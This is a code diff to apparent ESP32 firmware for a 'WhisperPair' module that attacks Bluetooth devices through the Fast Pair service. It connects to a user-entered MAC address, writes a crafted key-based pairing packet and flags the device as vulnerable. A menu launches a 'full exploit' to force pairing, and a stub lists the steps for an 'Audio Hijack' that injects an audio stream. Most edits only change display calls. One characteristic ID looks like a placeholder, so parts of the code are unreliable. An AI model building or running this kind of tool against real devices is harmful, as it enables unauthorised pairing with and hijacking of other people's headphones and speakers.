@@ -17,7 +17,7 @@ bool requireButtonHoldConfirmation(const char* message, uint32_t ms) {
     
     while(millis() - startTime < ms) {
         if(check(EscPress)) {
-            displayMessage("Cancelled");
+            displayMessage("Cancelled", "", "", "", 0);
             delay(1000);
             return false;
         }
@@ -29,7 +29,7 @@ bool requireButtonHoldConfirmation(const char* message, uint32_t ms) {
             tft.fillRect(20, 120, ((tftWidth-40) * progress) / 100, 10, TFT_GREEN);
         } else {
             if(holding) {
-                displayMessage("Released too soon");
+                displayMessage("Released too soon", "", "", "", 0);
                 delay(1000);
                 return false;
             }
@@ -39,7 +39,7 @@ bool requireButtonHoldConfirmation(const char* message, uint32_t ms) {
     }
     
     if(holding) {
-        displayMessage("Confirmed!");
+        displayMessage("Confirmed!", "", "", "", 0);
         delay(500);
         return true;
     }
@@ -48,21 +48,21 @@ bool requireButtonHoldConfirmation(const char* message, uint32_t ms) {
 }
 
 bool attemptKeyBasedPairing(NimBLEAddress target) {
-    displayMessage("Connecting to target...");
+    displayMessage("Connecting to target...", "", "", "", 0);
     
     NimBLEClient* pClient = NimBLEDevice::createClient();
     
     if(!pClient->connect(target)) {
-        displayMessage("Connection failed");
+        displayMessage("Connection failed", "", "", "", 0);
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
     
-    displayMessage("Connected, discovering...");
+    displayMessage("Connected, discovering...", "", "", "", 0);
     
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(pService == nullptr) {
-        displayMessage("Fast Pair service not found");
+        displayMessage("Fast Pair service not found", "", "", "", 0);
         pClient->disconnect();
         NimBLEDevice::deleteClient(pClient);
         return false;
@@ -70,7 +70,7 @@ bool attemptKeyBasedPairing(NimBLEAddress target) {
     
     NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
     if(pChar == nullptr) {
-        displayMessage("KBP char not found");
+        displayMessage("KBP char not found", "", "", "", 0);
         pClient->disconnect();
         NimBLEDevice::deleteClient(pClient);
         return false;
@@ -81,15 +81,18 @@ bool attemptKeyBasedPairing(NimBLEAddress target) {
     packet[1] = 0x11;
     
     uint8_t targetBytes[6];
-    target.getNative(targetBytes);
+    uint64_t addr = target.getNative();
+    for(int i = 0; i < 6; i++) {
+        targetBytes[5-i] = (addr >> (8*i)) & 0xFF;
+    }
     memcpy(&packet[2], targetBytes, 6);
     
     esp_fill_random(&packet[8], 8);
     
-    displayMessage("Sending test packet...");
+    displayMessage("Sending test packet...", "", "", "", 0);
     
     if(pChar->writeValue(packet, 16, false)) {
-        displayMessage("Packet sent, checking...");
+        displayMessage("Packet sent, checking...", "", "", "", 0);
         delay(100);
         
         bool vulnerable = pChar->canRead() || pChar->canNotify();
@@ -98,10 +101,10 @@ bool attemptKeyBasedPairing(NimBLEAddress target) {
         NimBLEDevice::deleteClient(pClient);
         
         if(vulnerable) {
-            displayMessage("DEVICE VULNERABLE!");
+            displayMessage("DEVICE VULNERABLE!", "", "", "", 0);
             return true;
         } else {
-            displayMessage("No response - may be patched");
+            displayMessage("No response - may be patched", "", "", "", 0);
             return false;
         }
     }
@@ -115,7 +118,7 @@ void testFastPairVulnerability() {
     String input = keyboard("", 17, "Target MAC (AA:BB:CC:DD:EE:FF)");
     if(input.isEmpty()) return;
     
-    NimBLEAddress target(input.c_str());
+    NimBLEAddress target(input.c_str(), BLE_ADDR_RANDOM);
     
     if(!requireButtonHoldConfirmation("Test vulnerability?", 3000)) {
         return;
@@ -157,9 +160,9 @@ void whisperPairMenu() {
         String input = keyboard("", 17, "Target MAC (AA:BB:CC:DD:EE:FF)");
         if(input.isEmpty()) return;
         
-        NimBLEAddress target(input.c_str());
+        NimBLEAddress target(input.c_str(), BLE_ADDR_RANDOM);
         
-        displayMessage("Starting full exploit...");
+        displayMessage("Starting full exploit...", "", "", "", 0);
         padprintln("1. Connect to device");
         padprintln("2. ECDH key exchange");
         padprintln("3. Complete pairing");
@@ -171,25 +174,25 @@ void whisperPairMenu() {
         bool success = whisperPairFullExploit(target);
         
         if(success) {
-            displayMessage("EXPLOIT SUCCESSFUL!");
-            displayMessage("Device paired");
+            displayMessage("EXPLOIT SUCCESSFUL!", "", "", "", 0);
+            displayMessage("Device paired", "", "", "", 0);
         } else {
-            displayMessage("Exploit failed");
-            displayMessage("May be patched");
+            displayMessage("Exploit failed", "", "", "", 0);
+            displayMessage("May be patched", "", "", "", 0);
         }
         delay(3000);
     }});
     
     options.push_back({"[!!!] Audio Hijack Test", []() {
-        displayMessage("NOT IMPLEMENTED");
-        displayMessage("Would require:");
-        displayMessage("1. Successful pairing");
-        displayMessage("2. A2DP profile connect");
-        displayMessage("3. Audio stream injection");
+        displayMessage("NOT IMPLEMENTED", "", "", "", 0);
+        displayMessage("Would require:", "", "", "", 0);
+        displayMessage("1. Successful pairing", "", "", "", 0);
+        displayMessage("2. A2DP profile connect", "", "", "", 0);
+        displayMessage("3. Audio stream injection", "", "", "", 0);
         delay(3000);
     }});
     
     options.push_back({"Back", []() { returnToMenu = true; }});
     
-    loopOptions(options, MENU_TYPE_SUBMENU, "WhisperPair");
+    loopOptions(options, MENU_TYPE_SUBMENU, "whisperPair");
 }
